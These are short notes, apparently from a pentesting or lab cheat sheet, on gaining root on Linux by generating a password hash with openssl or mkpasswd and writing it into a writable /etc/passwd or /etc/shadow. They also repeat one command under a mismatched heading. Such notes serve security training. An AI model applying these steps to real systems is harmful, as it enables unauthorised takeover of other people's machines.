### Check For write perm of /etc/passwd and /etc/shadow file
```
openssl passwd new_password
```
#### Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
```
mkpasswd -m sha-512 newpasswordhere
```
#### Check the hashing algorithm used
```
mkpasswd -m sha-512 newpasswordhere
```
#### Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
